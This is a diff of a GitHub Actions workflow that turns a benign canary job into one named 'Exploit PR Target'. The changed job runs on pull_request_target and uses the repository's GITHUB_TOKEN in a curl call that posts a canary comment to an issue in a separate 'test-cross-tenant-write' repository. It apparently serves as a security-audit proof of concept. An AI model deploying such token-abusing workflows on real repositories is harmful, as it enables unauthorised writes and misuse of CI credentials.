@@ -1,10 +1,15 @@
-name: Test Canary Workflow
-
-on: workflow_dispatch
+name: Exploit PR Target
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+  workflow_dispatch:
 
 jobs:
-  canary:
+  exploit:
     runs-on: ubuntu-latest
     steps:
       - name: Canary
-        run: echo "security-audit-canary-workflow-run-001"
+        run: |
+          echo "PULL_REQUEST_TARGET_CANARY"
+          echo "GITHUB_TOKEN present: ${{ github.token != '' }}"
+          curl -s -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/repos/ab-panther-581872/test-cross-tenant-write/issues/2/comments -d '{"body":"PULL_REQUEST_TARGET_CANARY_COMMENT"}'
